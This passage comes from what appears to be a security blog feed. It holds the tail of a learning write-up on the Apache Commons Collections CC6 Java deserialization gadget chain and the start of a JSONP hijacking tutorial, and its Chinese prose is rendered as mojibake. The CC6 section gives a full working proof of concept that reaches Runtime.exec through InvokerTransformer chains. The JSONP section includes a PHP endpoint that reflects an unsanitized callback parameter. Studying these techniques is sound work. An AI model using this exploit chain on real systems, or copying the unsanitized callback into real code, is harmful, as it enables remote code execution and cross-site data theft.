ä¸ºè¦ç»§æ‰¿Serializableæ¥å£ï¼Œè¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªHashMapå­˜æ”¾TiedMapEntryçš„å¯¹è±¡</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure><p>å°±å®Œäº‹äº†ã€‚ä½†æœ‰ä¸ªé—®é¢˜ï¼ŒexpMap.put(tme,â€valuevalueâ€)ï¼Œputæ–¹æ³•ä¹ŸåƒreadObjectä¸€æ ·ï¼Œè°ƒç”¨äº†ä¸€éhash(key)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±å¯¼è‡´lazyMapè¢«è°ƒç”¨äº†ä¸¤éï¼Œç¬¬ä¸€éæ˜¯fakeTransformersï¼Œç¬¬äºŒéæ˜¯æ¶æ„çš„transformersã€‚</p><p>faketransformersè™½ç„¶æ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å‘tmeæ·»åŠ äº†â€keykeyâ€çš„key(hashmapçš„keyéœ€è¦ä¸ºâ€keykeyâ€,ä¸èƒ½æ”¹é”®å€¼)ï¼Œå¯¼è‡´ç¬¬äºŒæ¬¡æ²¡èƒ½è¿›å…¥ifåˆ¤æ–­</p><p>ç”»ä¸ªå›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119175745839.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119175745839.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>æœ€åè§¦å‘å‘½ä»¤æ‰§è¡Œçš„transformer: key&#x3D;&#x3D;keykeyæ—¶è¾“å‡ºtrueï¼Œä¸è¿›å…¥å¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(map.containsKey(key)==<span class="literal">false</span>)&#123;</span><br><span class="line">        Object value=factory.transform(key);</span><br><span class="line">        map.put(key,value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>è§£å†³åŠæ³•:outerMap.remove(â€œkeykeyâ€)</p><p>å®Œæ•´poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//å…ˆç»‘å®šå‡transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119181540847.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119181540847.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å·¥å…·æ¨èï¼šSerializationDumper  16è¿›åˆ¶åºåˆ—åŒ–å†…å®¹è½¬å­—ç¬¦ä¸²</p><p>ysoserial  ç”¨æˆ·æ ¹æ®è‡ªå·±çš„åˆ©ç”¨é“¾ç”Ÿæˆååºåˆ—åŒ–æ•°æ®</p><p> ç”±äºæ˜¯é˜…è¯»pç¥çš„ã€Šjavaå®‰å…¨æ¼«è°ˆã€‹å­¦ä¹ çš„ï¼Œé‚£å¸®Pç¥åšä¸ªå®£ä¼ å§ã€‚æ–‡ç« æˆ–è®¸æœ‰è®¸å¤šé”™è¯¯ï¼Œè¯·æŒ‡æ­£</p><blockquote><p>æˆ‘æ­£åœ¨ã€Œä»£ç å®¡è®¡ã€å’Œæœ‹å‹ä»¬è®¨è®ºæœ‰è¶£çš„è¯é¢˜ï¼Œä½ â¼€èµ·æ¥å§ï¼Ÿ<br><a href="https://t.zsxq.com/08Yb">https://t.zsxq.com/08Yb</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONPåŠ«æŒ</title>
      <link href="/2022/08/18/jsonp-jie-chi/"/>
      <url>/2022/08/18/jsonp-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="JSONPæ¦‚å¿µ"><a href="#JSONPæ¦‚å¿µ" class="headerlink" title="JSONPæ¦‚å¿µ"></a>JSONPæ¦‚å¿µ</h1><p>JSONP&#x3D;JSON with padding</p><p>JSONPå®ç°è·¨åŸŸè¯·æ±‚ï¼Œå°±æ˜¯åŠ¨æ€åˆ›å»º<code>&lt;script&gt;</code>æ ‡ç­¾</p><p>å…ˆçœ‹ä¸€ä¸ªåŠ¨æ€åˆ›å»º<code>&lt;script&gt;</code>çš„ç®€è¿°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(script,<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>);</span><br></pre></td></tr></table></figure><p>å…ˆåˆ›å»ºscriptæ ‡ç­¾ï¼Œç„¶åå®šä¹‰srcï¼Œæ·»åŠ è‡³æ ‡ç­¾å±æ€§ã€‚srcæŒ‡å‘çš„å°±æ˜¯å›è°ƒä½ç½®</p><h2 id="è·¨åŸŸæµ‹è¯•"><a href="#è·¨åŸŸæµ‹è¯•" class="headerlink" title="è·¨åŸŸæµ‹è¯•"></a>è·¨åŸŸæµ‹è¯•</h2><p>å…ˆåœ¨æœ¬åœ°ç”¨phpstudyæµ‹è¯•ä¸€ä¸‹ï¼Œ1.htmlçš„å†…å®¹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>Â <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            type : <span class="string">&quot;get&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            url : <span class="string">&quot;http://localhost/godown.php?id=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,<span class="comment">//æŒ‡å®šæˆ‘ä»¬çš„è¯·æ±‚æ˜¯ä¸€ä¸ª jsonp çš„è¯·æ±‚</span></span></span><br><span class="line"><span class="language-javascript">            success : <span class="keyword">function</span>(<span class="params">data</span>) &#123;<span class="comment">//success æŒ‡å®šçš„æ˜¯é»˜è®¤çš„å›è°ƒå‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">jsonhandle</span>(data);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:application/json; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">19</span>,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jianshu&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å—åŒæºç­–ç•¥çº¦æŸï¼Œè®¿é—®1.htmlæ—¶ä¼šå¼¹çª—ã€‚</p><p>ä½†æ˜¯ç»“æœè¿”å›äº†æ— Access-Control-Allow-Originå€¼ï¼Œé˜»æ­¢äº†è·¨åŸŸè®¿é—®ã€‚å› ä¸ºæ¥è‡ªscriptæ ‡ç­¾å†…çš„getè¯·æ±‚ å’Œ godown.php ä¸åŒæº</p><p>è™½ç„¶æµè§ˆå™¨å—åˆ°äº†åŒæºç­–ç•¥çº¦æŸï¼Œä½†æ˜¯åœ¨å¼€å‘è¿‡ç¨‹è·¨åŸŸè¯·æ±‚å‡ ä¹æ˜¯å¿…é¡»ç”¨åˆ°ã€‚</p><p>ä½†æ˜¯ä»æœ‰åŠæ³•ï¼Œåœ¨htmlä¸­ï¼Œ<code>&lt;img&gt;</code>çš„srcã€<code>&lt;link&gt;</code>çš„hrefå’Œ<code>&lt;script&gt;</code>çš„srcï¼Œéƒ½å¯ä»¥æ— è§†åŒæºç­–ç•¥ï¼ŒåŸå› ä¹Ÿå¾ˆç®€å•ï¼Œè¿™å‡ ä¸ªæ ‡ç­¾çš„srcä¸€èˆ¬éƒ½è¦æŒ‡å‘å¤–é“¾</p><p>æ‰€ä»¥åœ¨&lt;script&gt;çš„srcç›´æ¥æŒ‡å‘jsæ–‡ä»¶å³å¯è®¿é—®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/remote.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>remote.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">jsonhandle</span>(&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span> : <span class="number">15</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿œç¨‹jsä¸éœ€è¦scriptæ ‡ç­¾ã€‚è¿˜èƒ½ç›´æ¥ä½¿ç”¨1.htmlå®šä¹‰çš„å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212195553076.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212195553076.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="jsonpæµ‹è¯•"><a href="#jsonpæµ‹è¯•" class="headerlink" title="jsonpæµ‹è¯•"></a>jsonpæµ‹è¯•</h2><p>1.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost/godown.php?id=1&amp;callback=jsonhandle&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> obj = $(<span class="string">&#x27;&lt;script&gt;&lt;\/script&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        obj.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>,url);</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;body&quot;</span>).<span class="title function_">append</span>(obj);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·çš„å®šä¹‰ä¸€ä¸ªjsonhandleå‡½æ•°ï¼ŒåŒæ ·çš„æŠŠurlæ”¾è¿›scriptæ ‡ç­¾çš„srcå±æ€§ï¼Œç„¶åæ”¾è¿›htmlçš„bodyéƒ¨åˆ†ã€‚ä¸åŒçš„æ˜¯godown.phpæ¥æ”¶callbackå‚æ•°ï¼Œç­‰äºè°ƒç”¨jsonhandleå‡½æ•°</p><p>godown.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;dada&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212200329246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212200329246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>jsonpå’Œè¿œç¨‹è°ƒç”¨remote.jsæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå…¶å®å°±æ˜¯åŠ äº†ä¸ªcallbackå›è°ƒå‚æ•°</p><p>åˆ©ç”¨jqueryåº“å¯ä»¥æ›´æ–¹ä¾¿çš„è·¨åŸŸï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            type : <span class="string">&quot;get&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            url : <span class="string">&quot;http://localhost/godown.php?id=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">jsonp</span>:<span class="string">&quot;callback&quot;</span>, <span class="comment">//æŒ‡å®šå›è°ƒå‡½æ•°åœ¨ URL ä¸­çš„å‚æ•°å(ä¸æŒ‡å®šé»˜è®¤ä¸º callback)</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">jsonpCallback</span>: <span class="string">&quot;jsonhandle&quot;</span>,<span class="comment">//æŒ‡å®šå›è°ƒå‡½æ•°åç§°(å¦‚æœä¸æŒ‡å®šï¼ŒæœåŠ¡å™¨ä¼šéšæœºåˆ†é…ä¸€ä¸ªjQueryxxx 